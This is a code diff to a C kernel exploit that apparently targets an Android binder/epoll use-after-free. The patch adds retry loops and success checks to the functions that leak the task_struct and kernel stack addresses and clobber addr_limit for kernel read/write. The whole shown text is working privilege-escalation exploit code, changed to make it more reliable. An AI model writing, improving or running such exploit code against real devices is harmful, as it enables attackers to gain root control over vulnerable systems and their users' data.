@@ -23,6 +23,8 @@
 #define BINDER_SET_MAX_THREADS 0x40046205ul
 #define MAX_THREADS 2
 
+#define RETRIES 3
+
 #undef NO_PROC_KALLSYMS
 #define KALLSYMS_CACHING
 #define KSYM_NAME_LEN 128
@@ -270,23 +272,25 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
     message("PARENT: readv returns %d, expected %d", b, totalLength);
 
     if (testDatum != testValue)
-        error( "clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
+        message( "PARENT: **fail** clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
     else
-        message("PARENT: Clobbering test passed.");
+        message("PARENT: clobbering test passed");
 
     free(dummyBuffer);
     close(pipes[0]);
     close(pipes[1]);
 
-    return testDatum != testValue;
+    return testDatum == testValue;
 }
 
-void leak_data(void *leakBuffer, int leakAmount,
+int leak_data(void *leakBuffer, int leakAmount,
                unsigned long extraLeakAddress, void *extraLeakBuffer, int extraLeakAmount,
                unsigned long *task_struct_ptr_p, unsigned long *kstack_p)
 {
     unsigned long const minimumLeak = TASK_STRUCT_OFFSET_FROM_TASK_LIST + 8;
     unsigned long adjLeakAmount = MAX(leakAmount, 4336); // TODO: figure out why we need at least 4336; I would think that minimumLeak should be enough
+    
+    int success = 1;
 
     struct epoll_event event = {.events = EPOLLIN};
     int max_threads = 2;  
@@ -339,9 +343,9 @@ void leak_data(void *leakBuffer, int leakAmount,
         error( "fork");
     if (fork_ret == 0)
     {
-        int failed = 0;
-        
         /* Child process */
+        char childSuccess = 1;
+        
         prctl(PR_SET_PDEATHSIG, SIGKILL);
         usleep(DELAY_USEC);
         message("CHILD: Doing EPOLL_CTL_DEL.");
@@ -365,6 +369,7 @@ void leak_data(void *leakBuffer, int leakAmount,
 
         if (!isKernelPointer(addr)) {
             badPointer = 1;
+            childSuccess = 0;
         }
         
         unsigned long task_struct_ptr = 0;
@@ -382,31 +387,40 @@ void leak_data(void *leakBuffer, int leakAmount,
                 task_struct_ptr + 8,
                 8};
             message("CHILD: clobbering with extra leak structures");
-            clobber_data(addr, &extra, sizeof(extra));
-            message("CHILD: clobbered");
+            if (clobber_data(addr, &extra, sizeof(extra))) 
+                message("CHILD: clobbered");
+            else {
+                message("CHILD: **fail** iovec clobbering didn't work");
+                childSuccess = 0;
+            }
         }
 
         errno = 0;
         if (read(pipefd[0], dataBuffer + minimumLeak, adjLeakAmount - minimumLeak) != adjLeakAmount - minimumLeak)
-            error( "leaking");
+            error("leaking");
 
         write(leakPipe[1], dataBuffer, adjLeakAmount);
 
         if (extraLeakAmount > 0)
         {
             message("CHILD: extra leak");
-            if (read(pipefd[0], extraLeakBuffer, extraLeakAmount) != extraLeakAmount)
+            if (read(pipefd[0], extraLeakBuffer, extraLeakAmount) != extraLeakAmount) {
+                childSuccess = 0;
                 error( "extra leaking");
+            }
             write(leakPipe[1], extraLeakBuffer, extraLeakAmount);
             //hexdump_memory(extraLeakBuffer, (extraLeakAmount+15)/16*16);
         }
         if (kstack_p != NULL)
         {
-            if (read(pipefd[0], dataBuffer, 8) != 8)
+            if (read(pipefd[0], dataBuffer, 8) != 8) {
+                childSuccess = 0;
                 error( "leaking kstack");
+            }
             message("CHILD: task_struct_ptr = 0x%lx", *(unsigned long *)dataBuffer);
             write(leakPipe[1], dataBuffer, 8);
         }
+        write(leakPipe[1], &childSuccess, 1);
 
         close(pipefd[0]);
         close(pipefd[1]);
@@ -416,23 +430,29 @@ void leak_data(void *leakBuffer, int leakAmount,
         
         if (badPointer) {
             errno = 0;
-            error("problematic address pointer, e.g., %lx", addr);
+            message("CHILD: **fail** problematic address pointer, e.g., %lx", addr);
         }
         exit(0);
     }
-    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
-    message("PARENT: Calling WRITEV");
+    message("PARENT: soon will be calling WRITEV");
     errno = 0;
+    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
     b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
     message("PARENT: writev() returns 0x%x", (unsigned int)b);
-    if (b != totalLength)
-        error( "writev() returned wrong value: needed 0x%lx", totalLength);
+    if (b != totalLength) {
+        message( "PARENT: **fail** writev() returned wrong value: needed 0x%lx", totalLength);
+        success = 0;
+        goto DONE;
+    }
 
     message("PARENT: Reading leaked data");
 
     b = read(leakPipe[0], dataBuffer, adjLeakAmount);
-    if (b != adjLeakAmount)
-        error( "reading leak: read 0x%x needed 0x%lx", b, adjLeakAmount);
+    if (b != adjLeakAmount) {
+        message( "PARENT: **fail** reading leak: read 0x%x needed 0x%lx", b, adjLeakAmount);
+        success = 0;
+        goto DONE;
+    }
 
     if (leakAmount > 0)
         memcpy(leakBuffer, dataBuffer, leakAmount);
@@ -441,19 +461,33 @@ void leak_data(void *leakBuffer, int leakAmount,
     {
         message("PARENT: Reading extra leaked data");
         b = read(leakPipe[0], extraLeakBuffer, extraLeakAmount);
-        if (b != extraLeakAmount)
-            error( "reading extra leak: read 0x%x needed 0x%x", b, extraLeakAmount);
+        if (b != extraLeakAmount) {
+            message( "PARENT: **fail** reading extra leak: read 0x%x needed 0x%lx", b, extraLeakAmount);
+            success = 0;
+            goto DONE;
+        }
     }
 
     if (kstack_p != NULL)
     {
-        if (read(leakPipe[0], kstack_p, 8) != 8)
-            error( "reading kstack");
+        if (read(leakPipe[0], kstack_p, 8) != 8) {
+            message( "PARENT: **fail** reading leaked kstack");
+            success = 0;
+            goto DONE;
+        }
     }
+    
+    char childSucceeded=0;
+    
+    read(leakPipe[0], &childSucceeded, 1);
+    if (!childSucceeded)
+        success = 0;
+    
 
     if (task_struct_ptr_p != NULL)
         memcpy(task_struct_ptr_p, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
 
+DONE:    
     close(pipefd[0]);
     close(pipefd[1]);
     close(leakPipe[0]);
@@ -465,7 +499,10 @@ void leak_data(void *leakBuffer, int leakAmount,
 
     free(dataBuffer);
 
-    message("PARENT: Done with leaking");
+    if (success) 
+        message("PARENT: leaking successful");
+    
+    return success;
 }
 
 int kernel_rw_pipe[2];
@@ -961,12 +998,33 @@ int main(int argc, char **argv)
 
     unsigned long kstack = 0xDEADBEEFDEADBEEFul;
     unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;
-    leak_data(NULL, 0, 0, NULL, 0, &task_struct_ptr, &kstack);
+    int try = 0;
+    while (try < RETRIES && !leak_data(NULL, 0, 0, NULL, 0, &task_struct_ptr, &kstack)) {
+        message("MAIN: **fail** retrying");
+        try++;
+    }
+    if (try == RETRIES) {
+        error("Failed to leak data");
+    }
+    else if (try > 0) {
+        message("MAIN: took %d tries but did it", try);
+    }
     message("MAIN: task_struct_ptr = %lx", (unsigned long)task_struct_ptr);
     message("MAIN: stack = %lx", kstack);
     message("MAIN: Clobbering addr_limit");
     unsigned long const src = 0xFFFFFFFFFFFFFFFEul;
-    clobber_data(kstack + 8, &src, 8);
+
+    try = 0;
+    while(try < RETRIES && !clobber_data(kstack + 8, &src, 8)) {
+        message("MAIN: **fail** retrying");
+        try++;
+    }
+    if (try == RETRIES) {
+        error("Failed to clobber addr_limit");
+    }
+    else if (try > 0) {
+        message("MAIN: took %d tries but did it", try);
+    }
 
     message("MAIN: current->kstack == 0x%lx", kernel_read_ulong(task_struct_ptr + OFFSET__task_struct__stack));
 
